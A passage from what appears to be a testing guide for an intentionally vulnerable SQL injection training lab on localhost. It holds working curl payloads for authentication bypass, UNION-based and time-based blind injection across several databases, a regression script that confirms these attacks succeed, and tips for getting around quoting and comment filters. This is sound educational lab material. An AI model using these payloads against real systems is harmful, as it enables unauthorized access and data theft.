time curl -s "http://localhost:8080/login?db=pgsql" \
     -d "username=admin' AND pg_sleep(5) -- &password=test" > /dev/null

# MSSQL WAITFOR
echo -n "MSSQL WAITFOR DELAY: "
time curl -s "http://localhost:8080/login?db=mssql" \
     -d "username=admin'; WAITFOR DELAY '00:00:05' -- &password=test" > /dev/null
```

**Expected Results:**
- Each request should take ~5 seconds
- Variance should be < 0.5 seconds

---

## Regression Testing

Run this complete test suite before any code changes:

```bash
#!/bin/bash
# regression-test.sh

echo "=== SQL Injection Lab - Regression Tests ==="

# Test 1: Auth Bypass
echo "[1/10] Testing authentication bypass..."
curl -s "http://localhost:8080/login?db=mysql" \
     -d "username=admin' OR '1'='1&password=test" | grep -q "Login successful"
echo "‚úì Auth bypass working"

# Test 2: UNION injection
echo "[2/10] Testing UNION-based SQLi..."
curl -s "http://localhost:8080/search?db=mysql&q=' UNION SELECT VERSION(),NULL,NULL,NULL,NULL,NULL -- " \
     | grep -q "8.0"
echo "‚úì UNION injection working"

# Test 3: Time-based blind
echo "[3/10] Testing time-based blind SQLi..."
START=$(date +%s)
curl -s "http://localhost:8080/login?db=mysql" \
     -d "username=admin' AND SLEEP(3) -- &password=test" > /dev/null
END=$(date +%s)
DIFF=$((END-START))
if [ $DIFF -ge 3 ]; then
    echo "‚úì Time-based injection working ($DIFF seconds)"
else
    echo "‚úó Time-based injection FAILED"
fi

# Test 4-10: Add more tests...

echo "=== All Tests Complete ==="
```

---

## Security Testing Notes

### What to Look For

‚úÖ **Successful Exploitation:**
- SQL errors revealed
- Data extracted
- Commands executed
- Files written

‚ùå **Failed Exploitation:**
- Errors hidden
- Queries escaped
- No time delay observed
- Files not created

### Common Issues

1. **Quotes Not Working:**
   - Try different quote types: `'`, `"`, `` ` ``
   - Try encoded: `%27`, `%22`

2. **Comments Not Working:**
   - Try different comments: `--`, `#`, `/* */`
   - Add space after `--`: `-- `

3. **UNION Column Mismatch:**
   - Increment NULL count until successful
   - Check error messages for column count

4. **File Write Failed:**
   - Check permissions: `docker-compose exec web ls -la /var/www/uploads`
   - Verify path is correct
   - Check MySQL secure_file_priv setting

---

## Test Results Template

```
Date: _______________
Tester: _______________

| Test Case | MySQL | SQLite | PostgreSQL | MSSQL | Notes |
|-----------|-------|--------|------------|-------|-------|
| TC-001 Auth Bypass | ‚òê | ‚òê | ‚òê | ‚òê | |
| TC-002 Boolean Blind | ‚òê | ‚òê | ‚òê | ‚òê | |
| TC-003 Time Blind | ‚òê | ‚òê | ‚òê | ‚òê | |
| TC-004 Error-based | ‚òê | ‚òê | ‚òê | ‚òê | |
| TC-005 UNION | ‚òê | ‚òê | ‚òê | ‚òê | |
| TC-006 Stacked | ‚òê | ‚òê | ‚òê | ‚òê | |
| TC-007 File Write | ‚òê | ‚òê | ‚òê | ‚òê | |
| TC-008 RCE | ‚òê | ‚òê | ‚òê | ‚òê | |
| TC-009 OOB | ‚òê | ‚òê | ‚òê | ‚òê | |

Issues Found:
_________________________________________________________________
_________________________________________________________________

Overall Status: ‚òê PASS  ‚òê FAIL
```

---

**Happy Testing! Remember: This is for educational purposes only!**
</file>

</files>
